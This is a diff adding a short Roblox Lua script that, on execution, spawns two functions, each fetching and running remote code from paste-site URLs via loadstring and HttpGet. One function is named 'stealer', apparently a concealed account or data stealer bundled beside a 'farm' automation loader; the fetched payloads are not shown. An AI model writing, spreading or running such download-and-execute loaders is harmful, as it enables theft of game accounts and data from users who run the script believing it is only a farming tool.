@@ -1,0 +1,9 @@
+local function stealer()
+   loadstring(game:HttpGet("https://paste.debian.net/plainh/6fdc1788/", true))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://pastebin.com/raw/3Pvr5Pfy"))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
